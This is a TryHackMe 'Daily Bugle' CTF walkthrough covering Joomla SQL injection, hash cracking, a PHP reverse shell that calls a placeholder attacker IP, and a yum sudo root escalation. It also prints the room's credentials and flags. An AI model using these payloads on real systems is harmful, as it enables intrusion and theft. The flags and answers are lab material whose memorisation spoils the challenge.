
# Daily Bugle - TryHackMe CTF Writeup

This writeup covers the "Daily Bugle" CTF challenge on TryHackMe, you can find [here](https://tryhackme.com/room/dailybugle)

---

## Detailed Steps

### 1. Initial Enumeration
- Ran an initial `nmap` scan:
  ```bash
  nmap 10.10.85.222
  ```
- Results:
  ```
  PORT     STATE SERVICE
  22/tcp   open  ssh
  80/tcp   open  http
  3306/tcp open  mysql
  ```
- Followed with a detailed scan:
  ```bash
  nmap -A -p- 10.10.85.222
  ```
- Results:
  ```
  PORT     STATE SERVICE VERSION
  22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
  80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
  | http-robots.txt: 15 disallowed entries
  | /joomla/administrator/ /administrator/ /bin/ /cache/
  | /cli/ /components/ /includes/ /installation/ /language/
  |_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
  |_http-title: Home
  |_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
  |_http-generator: Joomla! - Open Source Content Management
  3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)
  OS details: Linux 4.15
  ```
- **Analysis**:
  - 3 open ports: SSH (22), HTTP (80, Joomla CMS), and MySQL (3306, MariaDB).
  - Joomla is identified via the `http-generator` tag and `/robots.txt` entries [].
  - MySQL is running but requires credentials (`unauthorized`) [].

### 2. Web Enumeration
- Visited `http://10.10.85.222` using `curl`:
  ```bash
  curl http://10.10.85.222
  ```
- Output: Confirmed Joomla CMS with a login form at `/index.php` and a Protostar template [].
- Ran `gobuster` to enumerate directories and files:
  ```bash
  gobuster dir -u http://10.10.85.222 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x .php,.txt,.ssh -t 100
  ```
- Results:
  ```
  /media (Status: 301)
  /templates (Status: 301)
  /modules (Status: 301)
  /images (Status: 301)
  /index.php (Status: 200)
  /bin (Status: 301)
  /plugins (Status: 301)
  /includes (Status: 301)
  /language (Status: 301)
  /README.txt (Status: 200)
  /components (Status: 301)
  /cache (Status: 301)
  /libraries (Status: 301)
  /robots.txt (Status: 200)
  /LICENSE.txt (Status: 200)
  /tmp (Status: 301)
  /layouts (Status: 301)
  /administrator (Status: 301)
  /configuration.php (Status: 200, Size: 0)
  /htaccess.txt (Status: 200)
  /cli (Status: 301)
  ```
- **Key Findings**:
  - `/administrator`: Joomla admin login panel [].
  - `/README.txt`: Revealed Joomla version 3.7.0, vulnerable to SQL injection (CVE-2017-8917) [].
  - `/configuration.php`: Empty response, but typically contains database credentials [].

### 3. Exploit Joomla SQL Injection (CVE-2017-8917)
- Used a Python exploit script (`joomla.py`) for Joomla 3.7.0 SQL injection []:
  ```bash
  python2 joomla.py http://10.10.85.222
  ```
- Output:
  ```
  [-] Fetching CSRF token
  [-] Testing SQLi
   - Found table: fb9j5_users
   - Extracting users from fb9j5_users
  [$] Found user [u'811', u'Super User', u'jonah', u'jonah@tryhackme.com', u'$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', u'', u'']
   - Extracting sessions from fb9j5_session
  ```
- **Findings**:
  - Username: `jonah`
  - Email: `jonah@tryhackme.com`
  - Password hash: `$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm` (bcrypt)
- **Explanation**: CVE-2017-8917 allows unauthorized SQL injection to extract user data from the Joomla database [].

### 4. Crack Password Hash
- Saved the hash:
  ```bash
  echo '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm' > hash.txt
  ```
- Cracked it with `john`:
  ```bash
  john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
  ```
- **Result**: Password is `spiderman123` [].
- **Credentials**: `jonah:spiderman123`.

### 5. Access Joomla Admin Panel
- Logged into `http://10.10.85.222/administrator` with `jonah:spiderman123`.
- Navigated to **Extensions > Templates > Protostar > error.php**.
- Added a PHP reverse shell from [revshells.com](https://www.revshells.com/) (example):
  ```php
  <?php
  $sock = fsockopen("[ATTACKER IP]", 4444);
  $proc = proc_open("/bin/bash", array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w")), $pipes);
  stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0);
  while (!feof($sock) && !feof($pipes[1])) {
      $read = array($sock, $pipes[1], $pipes[2]);
      $write = NULL; $except = NULL; $num_changed = stream_select($read, $write, $except, NULL);
      if ($num_changed > 0) {
          foreach ($read as $r) {
              $data = fread($r, 4096);
              if ($r == $sock) { fwrite($pipes[0], $data); }
              else { fwrite($sock, $data); }
          }
      }
  }
  fclose($sock); proc_close($proc);
  ?>
  ```
- Started a Netcat listener:
  ```bash
  nc -lvnp 4444
  ```
- Visited `http://10.10.85.222/templates/protostar/error.php` to trigger the shell.
- **Result**: Got a reverse shell as `apache`:
  ```bash
  whoami
  apache
  ```

### 6. Stabilize the Shell
- The shell was unstable, and `python3` was unavailable:
  ```bash
  python3 -c 'import pty; pty.spawn("/bin/bash")'
  ```
- Output: `python3` not found.
- Used `python` (Python 2) instead:
  ```bash
  python -c 'import pty; pty.spawn("/bin/bash")'
  ```
- **Result**: Stabilized the shell [].

### 7. Enumerate as apache
- Checked `sudo` privileges:
  ```bash
  sudo -l
  ```
- Output: Prompted for a password, indicating `apache` has no `sudo` access without credentials [].
- Found Joomla’s configuration file:
  ```bash
  cat /var/www/html/configuration.php
  ```
- Relevant content:
  ```php
  public $user = 'root';
  public $password = 'nv5uz9r3ZEDzVjNu';
  public $db = 'joomla';
  public $dbprefix = 'fb9j5_';
  ```

### 9. SSH as jjameson
- Tested SSH with the credentials from `configuration.php`:
  ```bash
  ssh jjameson@10.10.85.222
  ```
- Password: `nv5uz9r3ZEDzVjNu`
- Success: Logged in as `jjameson`.
- Found user flag:
  ```bash
  ls
  cat user.txt
  ```
- Content: `27a260fe3cba712cfdedb1c86d80442e` [].
- Checked `sudo` privileges:
  ```bash
  sudo -l
  ```
- Output:
  ```
  User jjameson may run the following commands on dailybugle:
      (ALL) NOPASSWD: /usr/bin/yum
  ```
- **Key Insight**: `jjameson` can run `yum` as `root` without a password, exploitable for privilege escalation [].

### 10. Escalate to Root with yum
- Visited [GTFOBins](https://gtfobins.github.io/gtfobins/yum/) for `yum` exploitation [].
- Used the plugin-based exploit to spawn a root shell:
  ```bash
  cd /tmp
  TF=$(mktemp -d)
  cat >$TF/x<<EOF
  [main]
  plugins=1
  pluginpath=$TF
  pluginconfpath=$TF
  EOF
  cat >$TF/y.conf<<EOF
  [main]
  enabled=1
  EOF
  cat >$TF/y.py<<EOF
  import os
  import yum
  from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
  requires_api_version='2.1'
  def init_hook(conduit):
    os.execl('/bin/sh','/bin/sh')
  EOF
  sudo yum -c $TF/x --enableplugin=y
  ```
- **Explanation**:
  - Creates a temporary directory (`$TF`).
  - Configures `yum` to load a custom plugin (`y.py`) that executes `/bin/sh` as `root`.
  - The `NOPASSWD` `sudo` permission allows this to run without a password [].
- **Result**: Got a root shell:
  ```bash
  id
  uid=0(root) gid=0(root) groups=0(root)
  ```
- Found the root flag:
  ```bash
  cd /root
  cat root.txt
  ```
- Content: `eec3d53292b1821868266858d7fa6f79` [].

---


## Flags
- **User flag**: `27a260fe3cba712cfdedb1c86d80442e`
- **Root flag**: `eec3d53292b1821868266858d7fa6f79`
